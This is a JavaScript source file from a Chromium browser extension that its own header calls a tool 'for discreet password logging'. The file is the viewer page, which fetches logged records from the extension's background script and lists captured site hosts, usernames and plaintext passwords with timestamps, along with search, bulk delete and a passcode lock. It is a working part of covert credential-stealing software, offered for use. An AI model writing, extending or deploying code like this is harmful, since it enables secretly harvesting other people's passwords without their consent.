// Gumshoe original contributors: ajar (Aaron Artille) | 0xAether (Aaron) | ncnlinh (Linh Nguyen).
// Gumshoe remake (re-create) by: retr0originall.
// A Chromium extension for discreet password logging.
var timeout;
var passcode;

window.onload = function () {
    var refineTxt = document.getElementById('refineTxt');
    var deleteBtn = document.getElementById('deleteBtn');
    var passcodeBtn = document.getElementById('passcodeBtn');
    var counter = document.getElementById('counter');
    var recordList = document.getElementById('recordList');
    var logo = document.getElementById('logo');
    var plug = document.getElementById('plug');

    if (refineTxt) {
        refineTxt.addEventListener('input', function () {
            clearTimeout(timeout);
            timeout = setTimeout(queryRecords, 100);
        });
    }

    if (deleteBtn) {
        deleteBtn.addEventListener('click', function () {
            if (parseInt(counter.innerHTML) > 0 && confirm('Delete ' + counter.innerHTML +
                ' record(s)? Severely permanent, mind you.')) {
                queryRecords('delete');
            }
        });
    }

    chrome.storage.local.get('passcode', function (response) {
        passcode = response.passcode || '';
    });

    if (passcodeBtn) {
      passcodeBtn.addEventListener('click', function() {
      var p = prompt('Enter a passcode (minimum 4 characters):', passcode);
      if (p && p.length >= 4) {
        chrome.storage.local.set({ 'passcode': p }, function() {
          passcode = p;
          alert('Passcode changed to: ' + p);
        });
        } else if (p !== null) {
         alert('Passcode must be at least 4 characters.');
        }
      });
    }

    if (logo && plug) {
        logo.addEventListener('mouseover', function () {
            plug.style.display = 'block';
        });
        logo.addEventListener('mouseout', function () {
            plug.style.display = 'none';
        });
    }

    function queryRecords(crud) {
        if (!crud) crud = 'read';

        chrome.runtime.sendMessage({
            action: 'queryDatabase',
            crud: crud,
            refine: refineTxt ? refineTxt.value : ''
        }, function (response) {
            if (chrome.runtime.lastError) {
                console.error('Błąd komunikacji:', chrome.runtime.lastError.message);
                return;
            }
            if (!response) {
                console.error('Brak odpowiedzi od background.js');
                return;
            }

            if (crud === 'delete') {
                queryRecords();
                return;
            }

            counter.textContent = response.length;
            recordList.innerHTML = '';

            for (var i = 0; i < response.length; i++) {
                var row = response[i];

                var userDisplay = formatText(row.user);
                var passDisplay = formatText(row.pass);

                recordList.innerHTML += '<li>' +
                    '<a href="' + escapeHtml(row.href) + '" target="_blank" rel="noopener noreferrer">' +
                    escapeHtml(row.host) + '</a> ' +
                    userDisplay + ' &#8227; ' + passDisplay +
                    '<p>' + escapeHtml(row.time) + '</p></li>';
            }
        });
    }

    function escapeHtml(text) {
        if (!text) return '';
        return text.replace(/&/g, "&amp;")
            .replace(/</g, "&lt;")
            .replace(/>/g, "&gt;")
            .replace(/"/g, "&quot;")
            .replace(/'/g, "&#039;");
    }

    function formatText(text) {
        if (!text) return '';
        const isPopup = window.location.pathname.includes('popup.html');
        if (isPopup && text.length > 23) {
            return 'Too large text';
        }
        return escapeHtml(text);
    }

    queryRecords();
};



